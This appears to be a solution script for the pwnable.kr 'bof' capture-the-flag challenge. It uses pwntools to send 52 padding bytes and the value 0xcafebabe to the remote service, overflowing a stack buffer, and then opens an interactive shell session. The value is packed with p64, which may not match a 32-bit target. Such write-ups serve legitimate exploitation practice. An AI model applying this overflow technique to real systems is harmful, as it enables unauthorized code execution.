from pwn import *

p = remote('pwnable.kr', 9000)
#p = process("./bof")

pause()
payload = 'a'* (52)
payload += p64(0xcafebabe)

p.sendline(payload)

p.interactive()
